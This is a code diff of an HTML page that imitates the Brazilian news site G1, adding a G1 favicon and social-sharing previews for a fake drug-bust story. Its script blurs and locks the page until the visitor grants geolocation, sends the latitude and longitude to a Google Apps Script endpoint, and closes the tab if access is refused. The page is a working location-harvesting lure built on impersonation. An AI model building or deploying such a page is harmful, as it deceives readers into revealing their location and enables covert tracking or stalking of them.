@@ -4,6 +4,23 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>G1 - Notícias</title>
+
+  <!-- Favicon estilo G1 -->
+  <link rel="icon" href="https://s2.glbimg.com/YAYy5YZABTE9_kDu5CYGskvgq1E=/80x80/top/smart/filters:strip_icc()/s.glbimg.com/jo/g1/f/original/2018/04/23/favicon.ico" type="image/x-icon" />
+
+  <!-- Open Graph -->
+  <meta property="og:title" content="Plantação de maconha e laboratório de drogas são encontrados em casa na BR-265" />
+  <meta property="og:description" content="Polícia Militar apreende plantação de maconha e laboratório na zona rural de Lavras, Minas Gerais." />
+  <meta property="og:image" content="https://s2.glbimg.com/3QXk3vYoRLkX0I1swmV_FzSxpBY=/640x360/smart/filters:strip_icc()/s.glbimg.com/jo/g1/f/original/2021/06/16/policia-plantacao.jpg" />
+  <meta property="og:url" content="https://seudominio.com/sua-pagina.html" />
+  <meta property="og:type" content="website" />
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Plantação de maconha e laboratório de drogas são encontrados em casa na BR-265" />
+  <meta name="twitter:description" content="Polícia Militar apreende plantação de maconha e laboratório na zona rural de Lavras, Minas Gerais." />
+  <meta name="twitter:image" content="https://s2.glbimg.com/3QXk3vYoRLkX0I1swmV_FzSxpBY=/640x360/smart/filters:strip_icc()/s.glbimg.com/jo/g1/f/original/2021/06/16/policia-plantacao.jpg" />
+
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -79,8 +96,8 @@
     /* Blur e bloqueio inicial */
     .blurred {
       filter: blur(8px);
-      pointer-events: none; /* bloqueia interações */
-      user-select: none; /* bloqueia seleção */
+      pointer-events: none;
+      user-select: none;
     }
 
     /* Overlay que escurece e bloqueia */
@@ -129,18 +146,15 @@
   <div id="overlay">Por favor, permita o acesso à sua localização para continuar navegando</div>
 
   <script>
-    // Ao carregar a página, adiciona o blur e overlay
     document.body.classList.add('blurred');
 
     function liberarConteudo() {
-      // Remove blur e oculta overlay
       document.body.classList.remove('blurred');
       document.getElementById('overlay').style.display = 'none';
     }
 
     window.addEventListener('load', () => {
       if (!navigator.geolocation) {
-        // Não suporta geolocalização, fecha aba
         window.close();
         return;
       }
@@ -149,7 +163,6 @@
         const lat = pos.coords.latitude;
         const lon = pos.coords.longitude;
 
-        // Envia dados para Google Script
         const url = "https://script.google.com/macros/s/AKfycbwk5F09_2ajt_z2a054KA369U7s33QNwLiTu1AO06KbvU4mRUgQixX-yICwbMzYLxHF/exec";
         const payload = { latitude: lat, longitude: lon };
         try {
@@ -164,7 +177,6 @@
         liberarConteudo();
 
       }, (error) => {
-        // Usuário negou ou erro ao obter localização - fecha aba
         window.close();
       });
     });
